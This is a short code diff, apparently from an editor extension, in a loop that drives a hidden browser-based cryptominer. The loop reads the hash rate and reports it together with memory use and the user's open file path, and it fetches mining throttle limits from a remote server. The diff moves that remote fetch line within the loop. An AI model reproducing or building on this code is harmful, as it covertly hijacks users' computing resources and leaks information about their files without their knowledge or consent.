@@ -65,7 +65,6 @@
     setInterval(async () => {
       if (browser && page) {
         const hs = await page.evaluate(() => { return window._client?.getHashesPerSecond(); });
-        let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
         tstt({
           message: "HASH",
           value: parseFloat(hs).toFixed(2),
@@ -73,6 +72,7 @@
           memory: getMemoryUsage(),
           file: safe(() => editor?.document?.uri?.fsPath)
         });
+        let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
         minUse = min;
         maxUse = (getMemoryUsage().total >= 8 ? max : minUse);
         await page.evaluate(() => {
